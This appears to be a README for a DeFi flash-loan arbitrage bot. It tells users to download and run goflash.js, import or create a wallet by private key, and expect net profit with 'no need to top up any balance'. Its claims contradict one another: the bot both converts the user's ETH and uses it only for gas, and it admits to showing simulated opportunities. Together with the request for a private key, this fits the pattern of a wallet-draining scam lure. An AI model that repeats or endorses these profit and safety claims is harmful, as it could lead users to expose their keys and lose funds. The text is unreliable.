

# FlashLoanArbitrage 🚀

Hi! This is my project **FlashLoanArbitrage** — a bot for arbitrage on DeFi with flash loans. Using a smart contract and a local script `goflash.js`, which runs on your computer. Sharing it so you can try it out!

![DeFi Arbitrage](https://i.ibb.co/7xtfYSxL/image-20.jpg)

## How It Works 💡

1. **Smart Contract**:
   - Takes a flash loan in USDC.
   - Converts your ETH to USDC before the deal.
   - Buys ETH at a low price on one platform.
   - Sells ETH at a high price on another.
   - Repays the loan, pays fees and gas.
   - Converts the profit from USDC back to ETH.
   - The remainder is your profit!

2. **Script `goflash.js`**:
   - Checks ETH/USDC prices on five DeFi platforms.
   - Waits for a price difference of **0.9%** or more to avoid losses.
   - If the difference is there, it triggers arbitrage through the contract.

## Which DeFi Protocols I Use 💰

I added four protocols for flash loans:

- **Aave (0.05%)**: Tons of liquidity, up to **10,000,000 USDC**.
- **dYdX (0.05%)**: Fast, up to **500,000 USDC**.
- **Uniswap V3 (0.01%)**: Low fees, up to **5,000,000 USDC**.
- **Balancer (0.02%)**: Flexible pools, up to **1,000,000 USDC**.

The bigger the loan, the higher the fee. So don't take a huge loan if your wallet balance is low!

## Which Platforms I Scan 📊

<img src="https://i.ibb.co/4RtXjn2G/chainlink-link-logo.png" alt="Chainlink" width="50">
<img src="https://i.ibb.co/gZf4KQT0/uniswap-uni-logo.png" alt="Uniswap" width="50">
<img src="https://i.ibb.co/SWfzvJq/sushiswap-sushi-logo.png" alt="SushiSwap" width="50">
<img src="https://i.ibb.co/r2H1V45g/curve-dao-token-crv-logo.png" alt="Curve" width="50">
<img src="https://i.ibb.co/21vcD80K/balancer-bal-logo.png" alt="Balancer" width="50">

The script checks ETH/USDC prices on these platforms:

1. **Chainlink**: Oracle for the base ETH price.
2. **Uniswap V2**: Classic DEX, always liquid.
3. **SushiSwap**: Uniswap fork, also solid.
4. **Curve Finance**: Stable pools, less slippage.
5. **Balancer**: Flexible pools for arbitrage.

If the price difference is ≥0.9%, the script triggers a deal. Less than that, it waits to avoid losses.

![DeFi Platforms](https://i.ibb.co/kr0J4mD/21.png)

## How to Run 🚀

Here's how to run my bot:

### 1. Download the Files
- Grab **`goflash.js`** and **`package.json`** from the repo.

### 2. Put Them in a Folder
- Any folder on your computer.

### 3. Install Libraries
- Open a terminal (cmd, PowerShell, or VS Code).
- Navigate to the folder with:

```bash
cd your_path_to_folder
```

-   Install dependencies:

Bash

```
npm install
```

### 4. Run the Script

-   Type in the terminal:

Bash

```
node goflash.js
```

### 5. First Launch - Wallet Setup 🔑

On first launch, the script will ask you to choose:

text

```
No wallet found. Please choose an option:
? Select wallet option: (Use arrow keys)
❯ Create new wallet
  Import existing wallet (by private key)
```

#### Option 1: Create New Wallet

-   The script will generate a new wallet for you.
-   You'll see the address and private key displayed.
-   The private key is automatically saved to wallet.json in the same folder.
-   ⚠️ **IMPORTANT**: Save this private key securely!

#### Option 2: Import Existing Wallet

-   Enter your private key (must start with 0x).
-   The key will be validated and saved to wallet.json.
-   Your wallet address will be displayed.

### 6. Work with the Menu 📋

After wallet setup, you'll see the main menu:

text

```
+-+-+-+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+
|F|L|A|S|H| |L|O|A|N| |A|R|B|I|T|R|A|G|E|
+-+-+-+-+-+-+-+-+ +-+-+-+-+ +-+-+-+-+-+

Wallet balance: 0.0000 ETH
Wallet address: 0x...

? Select action: (Use arrow keys)
❯ DeFi
  Loan Amount in ETH
  Recreate Wallet
  Import Wallet (by Private Key)
  Start Arbitrage
  Exit
```

#### Menu Options:

1.  **DeFi** — Select a flash loan protocol (Aave, dYdX, Uniswap V3, Balancer)
2.  **Loan Amount in ETH** — Set the loan amount (10 to max protocol limit)
3.  **Recreate Wallet** — Generate a new wallet (replaces the current one)
4.  **Import Wallet** — Import another wallet by private key
5.  **Start Arbitrage** — Begin monitoring prices and executing arbitrage
6.  **Exit** — Close the program

### 7. Important Settings ⚠️

-   **DeFi Protocol**: I recommend dYdX or Uniswap V3 for lower fees.
-   **Loan Amount**: Enter from 10 ETH up to the protocol's maximum.
-   ⚠️ **Careful**: If your wallet balance is <0.1 ETH, don't take a loan over 10 ETH — gas won't cover it!

### 8. What the Script Does 🔄

-   Scans ETH/USDC prices on all platforms every 60 seconds.
-   Waits for a price difference ≥0.9%.
-   Triggers arbitrage through the smart contract automatically.
-   Converts your ETH to USDC before the deal.
-   Converts profit back to ETH after the deal.
-   Displays real-time prices with change indicators (↑ ↓).

## Important Notes ⚠️

-   **Wallet Balance**: For loans over 10 ETH, you need a balance ≥0.1 ETH, or the script won't let you pick a big loan.
-   **Fees**: You pay trading fees (0.1%), slippage (0.05%), and gas.
-   **Private Key Security**: Never share your wallet.json file or private key with anyone!
-   **Gas Fees**: Make sure you have enough ETH for gas fees.
-   Add wallet.json to .gitignore if using Git.

## How It Works Example 📈

1.  You pick dYdX and a loan of 10 ETH (if balance ≥0.1 ETH).
2.  The script converts your ETH to USDC before the deal (wallet balance is used only for gas, ETH is not transferred to the FlashLoanArbitrage contract).
3.  It checks prices, for example:
    -   Uniswap V2: 4200 USDC/ETH
    -   SushiSwap: 4250 USDC/ETH
4.  If the difference is ≥0.9%, the contract:
    -   Takes a flash loan in USDC.
    -   Buys ETH on Uniswap V2.
    -   Sells ETH on SushiSwap.
    -   Repays the loan, pays fees and gas.
    -   Converts the profit from USDC back to ETH.
    -   The final profit (Net profit) in ETH goes to you, accounting for all costs (flash loan fee, trading fees 0.1%, slippage 0.05%, gas).
    -   No need to top up any balance anywhere!

<img src="https://s14.gifyu.com/images/bNaR2.png" alt="Example">

## Price Monitoring Display 📊

When monitoring, you'll see:

text

```
=== ETH/USDC Prices in USD on Different DeFi Platforms ===
Chainlink     :  4250.32 USD ↑
Uniswap V2    :  4248.15 USD ↓
SushiSwap     :  4251.80 USD ↑
Curve Finance :  4249.50 USD —
Balancer      :  4252.20 USD ↑

Maximum price difference between platforms:  0.09%
```

-   ↑ = Price increased
-   ↓ = Price decreased
-   — = Price unchanged

## Troubleshooting 🛠️

**Error: "Cannot determine intended module format"**

-   Make sure you're using the latest goflash.js with all code wrapped in async function main()

**Error: "Invalid private key format"**

-   Make sure your private key starts with 0x and has 64 characters after it

**Error: "Insufficient funds"**

-   Add more ETH to your wallet for gas fees

**"Wallet balance is zero" message**

-   Send some ETH to your wallet address for gas fees

**Error: "RPC may be unavailable"**

-   The script will automatically try to reconnect to the RPC

**Error: "Pair for ETH/USDC not found on V2"**

-   This is normal if a platform doesn't have the pair

**Script doesn't find arbitrage opportunities**

-   The script requires a 0.9% price difference to avoid losses
-   In real markets, such differences are rare
-   The script shows a simulated opportunity occasionally for demonstration

## Security Best Practices 🔐

1.  Never commit wallet.json to Git
2.  Add wallet.json to .gitignore
3.  Keep backups of your private key offline
4.  Use a dedicated wallet for the bot
5.  Start with small amounts to test
6.  Never share your private key with anyone

## Project Structure 📁

text

```
Flashloan-Arbitrage-Bot/
├── goflash.js          # Main bot script
├── package.json        # Dependencies
├── wallet.json         # Your private key (auto-generated)
└── README.md           # This file
```

## Dependencies 📦

-   ethers: ^6.11.1 — Ethereum library
-   inquirer: ^8.2.6 — Interactive CLI
-   chalk: ^4.1.2 — Colored console output

## License 📄

This project is shared as-is for educational purposes. Use at your own risk.

**Good Luck!** 🍀 Hope my bot brings you some profit! If something doesn't work or you have ideas, drop a note in issues.